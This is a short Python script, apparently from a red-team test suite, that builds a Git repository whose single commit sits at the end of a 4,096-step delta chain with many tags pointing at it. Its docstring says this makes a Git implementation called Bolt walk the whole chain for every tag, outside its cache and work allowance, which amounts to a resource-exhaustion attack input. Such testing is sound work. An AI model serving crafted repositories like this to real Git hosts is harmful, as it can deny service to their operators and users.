"""Builds one commit at the end of a chain of D deltas (Bolt allows 4,096), and T lightweight tags
on it in packed-refs. Pass 1 looks at each tag's target with `Repo::header`, which walks the whole
chain each time, without the base cache and without counting toward the work allowance.
Usage: python3 -I deep-tags.py <dir> <T> [D]"""
import sys

sys.path.insert(0, "/work/redteam/attacks3")
from gitrepo import Repo, PackWriter, oid, commit_bytes, copy_op, insert_ops, varint

root, tags = sys.argv[1], int(sys.argv[2])
depth = int(sys.argv[3]) if len(sys.argv) > 3 else 4096
repo = Repo(root)
pack = PackWriter(repo, 2 + depth)
tree = oid(b"tree", b"")
pack.whole(b"tree", b"", tree)
prev = commit_bytes(tree, [], b"chain 0\n")
prev_at = pack.whole(b"commit", prev, oid(b"commit", prev))
keep = len(prev) - len(b"chain 0\n")
for i in range(1, depth + 1):
    data = commit_bytes(tree, [], b"chain %d\n" % i)
    delta = (varint(len(prev)) + varint(len(data)) + copy_op(0, keep)
             + insert_ops(data[keep:]))
    prev_at = pack.ofs_delta(prev_at, delta, oid(b"commit", data))
    prev = data
tip = oid(b"commit", prev)
pack.finish()
repo.ref("refs/heads/main", tip)
lines = [b"# pack-refs with: peeled fully-peeled sorted \n"]
lines += [b"%s refs/tags/t%06d\n" % (tip.hex().encode(), i) for i in range(tags)]
repo.file("packed-refs", b"".join(lines))
